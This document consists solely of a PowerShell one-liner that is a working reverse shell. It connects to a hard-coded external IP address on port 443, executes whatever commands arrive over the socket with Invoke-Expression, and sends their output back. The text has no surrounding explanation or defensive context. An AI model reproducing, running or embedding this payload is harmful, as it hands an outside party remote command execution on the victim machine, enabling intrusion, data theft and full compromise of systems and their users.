$Client=New-Object System.Net.Sockets.TCPClient('18.191.49.166',443);$Stream=$Client.GetStream();[byte[]]$Bytes=0..65535|%{0};while(($Read=$Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0){;$Command=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $Read);$OutPut=(IEX($Command) 2>&1 | Out-String);$SendByte=([text.encoding]::ASCII).GetBytes($OutPut);$Stream.Write($SendByte,0,$SendByte.Length);$Stream.Flush()};$Client.Close();Exit
